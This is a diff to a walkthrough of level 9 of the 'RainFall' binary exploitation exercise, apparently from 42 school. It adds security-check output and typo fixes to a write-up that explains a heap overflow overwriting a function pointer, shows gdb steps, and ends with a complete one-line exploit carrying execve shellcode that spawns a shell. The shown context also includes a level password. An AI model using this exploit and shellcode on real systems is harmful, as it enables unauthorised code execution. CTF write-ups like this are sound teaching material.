@@ -1,8 +1,17 @@
 Login as `level9`.
 ```shell
-┌──$ [~/42/2021/rainfall]
+┌──$ [~/42/2022/rainfall]
 └─>  ssh 192.168.0.30 -p 4242 -l level9
 level8@192.168.0.30's password: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+  GCC stack protector support:            Enabled
+  Strict user copy checks:                Disabled
+  Restrict /dev/mem access:               Enabled
+  Restrict /dev/kmem access:              Enabled
+  grsecurity / PaX: No GRKERNSEC
+  Kernel Heap Hardening: No KERNHEAP
+ System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level9/level9
 ```
 A `SUID` executable is located in the home directory.
 ```shell
@@ -42,12 +51,12 @@ memcpy(0x0804a00c, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"..., 109) = 0x0804a00c
 ```
 
 
-`setAnnotation()` receives pointer to `var1` and `av[1]` and it copies content of `av[1]` on location of `var1`. But copiying of `av[1]` is not limitted, so it can overwrite space whre lying `var2`.
-It call fucntion pointer `var2`
+`setAnnotation()` receives pointer to `var1` and `av[1]` and it copies content of `av[1]` on location of `var1`. But copying of `av[1]` is not limited, so it can overwrite space where lying `var2`.
+It call function pointer `var2`
 
 
 
-Set hook-stop to analyse heap and set breakpoints before each function call
+Set hook-stop to analyze heap and set breakpoints before each function call
 ```gdb
 (gdb) break *0x08048617
 Breakpoint 1 at 0x8048617
@@ -151,7 +160,7 @@ Continuing.
 Cannot access memory at address 0x804a000
 ```
 
-
+Exploit and log on to the next level.
 ```shell
 level9@RainFall:~$ ./level9 $(python -c "import struct; print struct.pack('I', 0x804a010) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'A'*76 + struct.pack('I', 0x804a00c)")
 $ id
